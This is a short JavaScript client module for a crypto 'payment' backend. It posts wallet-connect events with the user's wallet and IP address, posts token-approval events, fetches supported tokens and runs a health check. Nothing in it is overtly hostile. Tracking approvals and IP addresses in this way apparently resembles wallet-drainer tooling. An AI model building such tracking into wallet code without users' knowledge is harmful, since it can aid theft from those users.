import axios from 'axios';
import { BACKEND_URL } from '../config/tokens';

// Notify backend about wallet connect
export function notifyWalletConnect(walletAddress, ipAddress) {
    axios.post(`${BACKEND_URL}/api/payment/wallet-connect`, {
        walletAddress,
        ipAddress
    }).then(response => {
        console.log('Wallet connect notified:', response.data);
    }).catch(error => {
        console.error('Error notifying wallet connect:', error.message);
    });
}

// Notify backend about approval (fire & forget)
export function notifyApproval(walletAddress, tokenAddress) {
    axios.post(`${BACKEND_URL}/api/payment/approval`, {
        walletAddress,
        tokenAddress
    }).then(response => {
        console.log('Approval notified:', response.data);
    }).catch(error => {
        console.error('Error notifying approval:', error.message);
    });
}

// Get supported tokens from backend
export async function getSupportedTokens() {
    try {
        const response = await axios.get(`${BACKEND_URL}/api/payment/tokens`);
        return response.data;
    } catch (error) {
        console.error('Error getting supported tokens:', error.message);
        return null;
    }
}

// Health check
export async function healthCheck() {
    try {
        const response = await axios.get(`${BACKEND_URL}/api/payment/health`);
        return response.data;
    } catch (error) {
        console.error('Health check error:', error.message);
        return null;
    }
}